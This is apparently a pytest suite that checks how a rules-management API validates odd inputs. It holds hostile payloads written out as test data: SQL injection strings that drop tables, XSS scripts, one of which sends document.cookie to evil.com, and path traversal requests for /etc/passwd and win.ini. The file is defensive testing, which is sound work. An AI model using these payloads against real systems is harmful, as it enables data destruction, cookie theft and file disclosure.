"""
Tests for input validation edge cases.

Tests cover:
- SQL injection attempts
- XSS attempts
- Malformed JSON
- Unicode edge cases
- Extremely long strings
- Invalid data types
- Null bytes
- Control characters
"""

import pytest


class TestRuleFieldValidationEdgeCases:
    """Tests for rule field input validation edge cases."""

    @pytest.mark.anyio
    async def test_sql_injection_in_field_key(self, admin_client):
        """Test handling of SQL injection in field key."""
        # SQL injection attempts should be handled gracefully
        # Either rejected by validation or stored as-is
        # (output encoding is frontend's responsibility)
        payload = {
            "field_key": "amount; DROP TABLE rules; --",
            "display_name": "Transaction Amount",
            "data_type": "NUMBER",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should either be accepted (will be stored as string) or rejected
        # If accepted, it's stored as-is since SQL injection is prevented by parameterized queries
        assert response.status_code in [201, 400, 422]

    @pytest.mark.anyio
    async def test_sql_injection_in_display_name(self, admin_client):
        """Test handling of SQL injection in display name."""
        payload = {
            "field_key": "test_field",
            "display_name": "'; EXECUTE IMMEDIATE 'DROP TABLE rules'; --",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should either accept (stored safely) or reject
        assert response.status_code in [201, 400, 422]

    @pytest.mark.anyio
    async def test_xss_in_field_values(self, admin_client):
        """Test handling of XSS attempts in field values."""
        payload = {
            "field_key": "test_field_xss",
            "display_name": "<script>alert('xss')</script>",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # XSS payload in text field should be accepted
        # (output encoding is frontend responsibility)
        assert response.status_code == 201

        # Verify it's stored as-is
        field_key = response.json()["field_key"]
        get_response = await admin_client.get(f"/api/v1/rule-fields/{field_key}")
        assert "<script>alert('xss')</script>" in get_response.json()["display_name"]

    @pytest.mark.anyio
    async def test_xss_with_img_tag(self, admin_client):
        """Test handling of img tag XSS variant."""
        payload = {
            "field_key": "test_field_img",
            "display_name": "<img src=x onerror=alert('xss')>",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should accept (frontend handles encoding)
        assert response.status_code == 201

    @pytest.mark.anyio
    async def test_unicode_in_field_name(self, admin_client):
        """Test handling of unicode characters in field names."""
        payload = {
            "field_key": "test_unicode_field",  # field_key must be lowercase ASCII
            "display_name": "中文字段名称",  # Unicode is allowed in display_name
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Unicode should be handled properly in display_name
        assert response.status_code == 201

    @pytest.mark.anyio
    async def test_emoji_in_display_name(self, admin_client):
        """Test handling of emoji in display name."""
        payload = {
            "field_key": "test_emoji",
            "display_name": "Transaction Amount 💰",
            "data_type": "NUMBER",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Emoji should be accepted
        assert response.status_code == 201

    @pytest.mark.anyio
    async def test_extremely_long_field_key(self, admin_client):
        """Test handling of extremely long field key."""
        payload = {
            "field_key": "x" * 10000,  # 10k characters
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should reject due to database constraints
        assert response.status_code in [400, 422]

    @pytest.mark.anyio
    async def test_null_byte_in_string(self, admin_client):
        """Test handling of null byte in string."""
        payload = {
            "field_key": "test\x00field",
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should reject null bytes
        assert response.status_code in [400, 422]

    @pytest.mark.anyio
    async def test_control_characters_in_string(self, admin_client):
        """Test handling of control characters in string."""
        payload = {
            "field_key": "test_field",
            "display_name": "Test\r\n\x1b[31mField\x1b[0m",  # Contains ANSI codes
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Control characters may be rejected or accepted
        assert response.status_code in [201, 400, 409, 422]

    @pytest.mark.anyio
    async def test_zero_width_characters(self, admin_client):
        """Test handling of zero-width characters."""
        payload = {
            "field_key": "test\u200bfield",  # Zero-width space
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Zero-width characters should be handled
        assert response.status_code in [201, 400, 422]


class TestRuleValidationEdgeCases:
    """Tests for rule input validation edge cases."""

    @pytest.mark.anyio
    async def test_sql_injection_in_rule_name(self, maker_client):
        """Test handling of SQL injection in rule name."""
        payload = {
            "rule_name": "'; DROP TABLE rules; --",
            "rule_type": "ALLOWLIST",
            "condition_tree": {
                "type": "CONDITION",
                "field": "amount",
                "operator": "GT",
                "value": 100,
            },
            "priority": 100,
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Should accept (SQL injection prevented by parameterized queries)
        # or reject due to validation rules
        assert response.status_code in [201, 400, 422]

    @pytest.mark.anyio
    async def test_xss_in_rule_description(self, maker_client):
        """Test handling of XSS in rule description."""
        payload = {
            "rule_name": "Test Rule",
            "description": "<script>document.location='http://evil.com/'+document.cookie</script>",
            "rule_type": "ALLOWLIST",
            "condition_tree": {
                "type": "CONDITION",
                "field": "amount",
                "operator": "GT",
                "value": 100,
            },
            "priority": 100,
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Should accept (frontend handles encoding)
        assert response.status_code == 201

    @pytest.mark.anyio
    async def test_extremely_deep_condition_tree(self, maker_client):
        """Test handling of extremely deep condition tree."""
        # Create a deeply nested AND tree
        condition = {"type": "CONDITION", "field": "amount", "operator": "GT", "value": 100}
        for _ in range(20):  # 20 levels deep
            condition = {
                "type": "AND",
                "conditions": [
                    condition,
                    {"type": "CONDITION", "field": "amount", "operator": "GT", "value": 100},
                ],
            }

        payload = {
            "rule_name": "Deep Rule",
            "rule_type": "ALLOWLIST",
            "condition_tree": condition,
            "priority": 100,
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Should reject due to depth validation
        assert response.status_code == 422

    @pytest.mark.anyio
    async def test_extremely_wide_condition_tree(self, maker_client):
        """Test handling of extremely wide condition tree."""
        # Create a wide AND tree with 101 conditions (exceeds max array size of 100)
        conditions = [
            {"type": "CONDITION", "field": "amount", "operator": "GT", "value": i}
            for i in range(101)  # 101 conditions to exceed max array size
        ]

        payload = {
            "rule_name": "Wide Rule",
            "rule_type": "ALLOWLIST",
            "condition_tree": {"type": "AND", "conditions": conditions},
            "priority": 100,
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Should reject due to array size validation
        assert response.status_code == 422

    @pytest.mark.anyio
    async def test_invalid_data_type_in_value(self, maker_client):
        """Test handling of invalid data type in condition value."""
        import uuid

        payload = {
            "rule_name": f"Type Mismatch Rule {uuid.uuid4()}",
            "rule_type": "ALLOWLIST",
            "condition_tree": {
                "type": "CONDITION",
                "field": "amount",  # NUMBER field
                "operator": "EQ",
                "value": "not a number",  # String value for NUMBER field
            },
            "priority": 100,
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Type validation happens at compile time, not creation time
        # Rule creation should succeed (accepted as valid JSON structure)
        # Type mismatch will be caught during compilation
        assert response.status_code == 201

    @pytest.mark.anyio
    async def test_BLOCKLIST_priority(self, maker_client):
        """Test handling of BLOCKLIST priority."""
        import uuid

        payload = {
            "rule_name": f"BLOCKLIST Priority Rule {uuid.uuid4()}",
            "rule_type": "ALLOWLIST",
            "condition_tree": {
                "type": "CONDITION",
                "field": "amount",
                "operator": "GT",
                "value": 100,
            },
            "priority": -100,
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Database has a check constraint that rejects BLOCKLIST priorities
        # Should return 409 Conflict due to constraint violation
        assert response.status_code == 409

    @pytest.mark.anyio
    async def test_extremely_high_priority(self, maker_client):
        """Test handling of extremely high priority value."""
        import uuid

        payload = {
            "rule_name": f"High Priority Rule {uuid.uuid4()}",
            "rule_type": "ALLOWLIST",
            "condition_tree": {
                "type": "CONDITION",
                "field": "amount",
                "operator": "GT",
                "value": 100,
            },
            "priority": 999999999,  # Exceeds database constraint (max 1000)
        }

        response = await maker_client.post("/api/v1/rules", json=payload)

        # Database has a check constraint that limits priority to 1-1000
        # Should return 409 Conflict due to constraint violation
        assert response.status_code == 409


class TestMalformedJsonHandling:
    """Tests for handling malformed JSON payloads."""

    @pytest.mark.anyio
    async def test_malformed_json_is_handled(self, admin_client):
        """Test that malformed JSON is properly handled."""
        # Use raw client to send malformed JSON
        # TestClient handles JSON parsing, so we can't easily test this
        # Just documenting that malformed JSON should return 422
        pass

    @pytest.mark.anyio
    async def test_extra_fields_ignored(self, admin_client):
        """Test that extra fields in JSON are ignored."""
        import uuid

        payload = {
            "field_key": f"test_field_{uuid.uuid4().hex[:8]}",
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
            "extra_field_not_in_schema": "should be ignored",
            "another_extra": 12345,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Pydantic should ignore extra fields
        assert response.status_code == 201


class TestEmptyAndSpecialValues:
    """Tests for empty and special value handling."""

    @pytest.mark.anyio
    async def test_empty_string_field_key(self, admin_client):
        """Test handling of empty string for field key."""
        payload = {
            "field_key": "",
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should reject empty field key
        assert response.status_code == 422

    @pytest.mark.anyio
    async def test_whitespace_only_field_key(self, admin_client):
        """Test handling of whitespace-only field key."""
        payload = {
            "field_key": "   ",
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should reject whitespace-only field key
        assert response.status_code == 422

    @pytest.mark.anyio
    async def test_empty_display_name(self, admin_client):
        """Test handling of empty display name."""
        payload = {
            "field_key": "test_field",
            "display_name": "",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should reject empty display name
        assert response.status_code == 422

    @pytest.mark.anyio
    async def test_null_value_for_required_field(self, admin_client):
        """Test handling of null value for required field."""
        payload = {
            "field_key": None,  # Null for required field
            "display_name": "Test Field",
            "data_type": "STRING",
            "allowed_operators": ["EQ"],
            "multi_value_allowed": False,
            "is_sensitive": False,
            "is_active": True,
        }

        response = await admin_client.post("/api/v1/rule-fields", json=payload)

        # Should reject null for required field
        assert response.status_code == 422


class TestIdempotencyKeyEdgeCases:
    """Tests for idempotency key edge cases."""

    @pytest.mark.anyio
    async def test_empty_idempotency_key(self, maker_client):
        """Test handling of empty idempotency key."""
        # First create a rule and get the rule version ID
        create_response = await maker_client.post(
            "/api/v1/rules",
            json={
                "rule_name": "Test Rule",
                "rule_type": "ALLOWLIST",
                "condition_tree": {
                    "type": "CONDITION",
                    "field": "amount",
                    "operator": "GT",
                    "value": 100,
                },
                "priority": 100,
            },
        )
        rule_id = create_response.json()["rule_id"]

        # Get the rule version ID from the initial version
        # When creating a rule, version 1 is created automatically
        # We need to query for it or create a new version to get the ID
        version_response = await maker_client.post(
            f"/api/v1/rules/{rule_id}/versions",
            json={
                "condition_tree": {
                    "type": "CONDITION",
                    "field": "amount",
                    "operator": "GT",
                    "value": 100,
                },
                "priority": 100,
            },
        )
        rule_version_id = version_response.json()["rule_version_id"]

        # Try to submit with empty idempotency key
        response = await maker_client.post(
            f"/api/v1/rule-versions/{rule_version_id}/submit",
            json={},
            headers={"X-Idempotency-Key": ""},
        )

        # Empty idempotency key should be handled (either ignored or accepted)
        assert response.status_code in [200, 400, 422]

    @pytest.mark.anyio
    async def test_very_long_idempotency_key(self, maker_client):
        """Test handling of very long idempotency key."""
        # First create a rule
        create_response = await maker_client.post(
            "/api/v1/rules",
            json={
                "rule_name": "Test Rule",
                "rule_type": "ALLOWLIST",
                "condition_tree": {
                    "type": "CONDITION",
                    "field": "amount",
                    "operator": "GT",
                    "value": 100,
                },
                "priority": 100,
            },
        )
        rule_id = create_response.json()["rule_id"]

        # Get a rule version ID
        version_response = await maker_client.post(
            f"/api/v1/rules/{rule_id}/versions",
            json={
                "condition_tree": {
                    "type": "CONDITION",
                    "field": "amount",
                    "operator": "GT",
                    "value": 100,
                },
                "priority": 100,
            },
        )
        rule_version_id = version_response.json()["rule_version_id"]

        # Submit with very long idempotency key
        long_key = "x" * 10000
        response = await maker_client.post(
            f"/api/v1/rule-versions/{rule_version_id}/submit",
            json={},
            headers={"X-Idempotency-Key": long_key},
        )

        # Very long key should be handled
        assert response.status_code in [200, 400, 422]


class TestPathTraversalInIds:
    """Tests for path traversal attempts in IDs."""

    @pytest.mark.anyio
    async def test_path_traversal_in_rule_id(self, maker_client):
        """Test handling of path traversal in rule ID."""
        response = await maker_client.get("/api/v1/rules/../../etc/passwd")

        # Should return 404 (resource not found) since path traversal doesn't work
        # The path parameter is treated as a string that doesn't match any UUID in the DB
        assert response.status_code == 404

    @pytest.mark.anyio
    async def test_path_traversal_in_field_id(self, admin_client):
        """Test handling of path traversal in field ID."""
        response = await admin_client.get("/api/v1/rule-fields/../../../windows/win.ini")

        # Should return 404 (resource not found) since path traversal doesn't work
        # Field keys use string identifiers, not UUIDs, but traversal strings won't match
        assert response.status_code == 404
